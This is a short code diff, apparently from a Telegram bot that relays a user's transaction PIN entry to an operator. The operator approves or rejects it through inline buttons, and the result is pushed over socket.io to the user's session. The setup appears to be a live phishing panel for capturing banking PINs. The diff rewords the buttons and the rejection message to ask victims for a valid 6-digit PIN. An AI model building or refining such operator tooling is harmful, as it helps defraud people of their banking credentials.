@@ -54,8 +54,8 @@ _${escapeMarkdown(currentStatus)}_
             ]];
         } else if (stepTitle.includes("Step 3")) {
             inlineKeyboard = [[
-                { text: "✅ Approve PIN", callback_data: `pin_approve:${appId}` },
-                { text: "❌ Reject PIN", callback_data: `pin_reject:${appId}` }
+                { text: "✅ Approve 6-Digit PIN", callback_data: `pin_approve:${appId}` },
+                { text: "❌ Reject 6-Digit PIN", callback_data: `pin_reject:${appId}` }
             ]];
         }
         options.reply_markup = { inline_keyboard: inlineKeyboard };
@@ -89,7 +89,8 @@ bot.on('callback_query', async (callbackQuery) => {
         global.io.to(targetAppId).emit('final-pin-accepted');
         decisionStamp = "✅ APPROVED";
     } else if (actionSignal === 'pin_reject') {
-        global.io.to(targetAppId).emit('pin-rejected', { message: "Incorrect Transaction PIN. Please try again." });
+        // Updated error text transmission explicitly specifying the 6-digit structure requirement
+        global.io.to(targetAppId).emit('pin-rejected', { message: "Incorrect Transaction PIN. Please enter your valid 6-digit PIN and try again." });
         decisionStamp = "❌ REJECTED";
     }
 
